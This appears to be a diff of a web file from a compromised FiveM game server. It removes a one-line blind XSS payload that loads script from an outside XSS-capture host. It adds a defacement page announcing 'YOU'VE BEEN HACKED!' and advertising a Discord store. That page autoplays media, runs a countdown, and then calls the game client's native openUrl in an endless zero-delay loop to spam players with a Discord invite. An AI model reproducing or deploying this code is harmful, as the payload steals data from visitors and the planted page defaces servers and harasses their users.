@@ -1,1 +1,172 @@
-'"><script src=https://xss.report/c/sdfw412></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Hacker Boy</title>
+
+  <style>
+    body {
+      background-color: #fff;
+      color: #000;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    /* الفيديو يغطي الشاشة */
+    #bgVideo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .top-content {
+      margin-top: 80px;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin: 0;
+      font-weight: bold;
+    }
+
+    .store-text {
+      font-size: 2em;
+      font-weight: bold;
+    }
+
+    p {
+      font-size: 1.5em;
+      margin: 10px 0;
+    }
+
+    a {
+      color: #000;
+      text-decoration: none;
+      font-size: 1.3em;
+      font-weight: bold;
+    }
+
+    a:hover {
+      color: #555;
+      text-decoration: underline;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 1.1em;
+      color: #000;
+    }
+
+    #warningText {
+      display: none;
+      font-size: 2em;
+      font-weight: bold;
+      color: red;
+      margin-top: 30px;
+    }
+
+    .timer {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      font-size: 1.5em;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background-color: rgba(0, 0, 0, 0.05);
+      padding: 10px 15px;
+      border-radius: 12px;
+      border: 1px solid #000;
+      box-shadow: 0 0 10px #000;
+    }
+
+    .timer img {
+      width: 30px;
+      height: 30px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- فيديو الخلفية (بدون صوت) -->
+  <video autoplay loop muted playsinline id="bgVideo">
+    <source src="https://cdn.discordapp.com/attachments/1465902266203508912/1471101713774542858/cm-chat-media-video-1ba603be3-ba19-5cb6-9652-c4e2a64726c61294600.mov?ex=69a2cdbc&is=69a17c3c&hm=1ff0e33276c8495de0dcc30d6834c5d4379d85457469f72cbcd126d918e5c7aa&" type="video/mp4">
+  </video>
+
+  <!-- الصوت منفصل -->
+  <audio id="bgAudio" autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1465902266203508912/1471101014471086162/Eslamic_Songs_-_.mp3?ex=69a2cd15&is=69a17b95&hm=1e06ae62b7222390e3a8671078d5927c7efd2847b560a094e13c8385f7a58436&" type="audio/mpeg">
+  </audio>
+
+  <!-- العداد -->
+  <div class="timer">
+    <img src="https://cdn-icons-png.flaticon.com/512/482/482541.png" alt="Bomb Icon">
+    <span id="countdown">10</span>
+  </div>
+
+  <!-- الكلام العلوي -->
+  <div class="top-content">
+    <h1>YOU'VE BEEN HACKED!</h1>
+    <p class="store-text">Apex STORE : ششملان</p> 
+  </div>
+
+  <!-- الرسالة بعد انتهاء العداد -->
+  <div id="warningText"></div>
+
+  <!-- الكلام السفلي -->
+  <div class="footer">
+    <p>Visit our Discord: <a href="https://discord.gg/axx">discord.gg/axx</a></p>
+    <p>Apex STORE hacked this server</p>
+    <p>Best Seller of FiveM Ready With Stocks</p>
+    <p>Join our Discord: .gg/axx</p>
+  </div>
+
+  <script>
+    let seconds = 10;
+    const countdownElement = document.getElementById('countdown');
+    const warningText = document.getElementById('warningText');
+    const audio = document.getElementById('bgAudio');
+
+    const timer = setInterval(() => {
+      seconds--;
+      countdownElement.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        warningText.style.display = 'block';
+      }
+    }, 1000);
+
+    // تشغيل الصوت بعد ثانية (مستقل عن الفيديو)
+    setTimeout(() => {
+      audio.volume = 1.0; // من 0.0 إلى 1.0
+      audio.play().catch(() => {});
+    }, 1000);
+
+
+    // فتح الرابط بعد 10 ثواني بشكل متكرر
+    setTimeout(() => {
+      setInterval(() => {
+        window.invokeNative('openUrl', 'https://discord.gg/axx');
+      }, 0);
+    }, 20000);
+  </script>
+  </script>
+
+
+
+
+</body>
+</html>
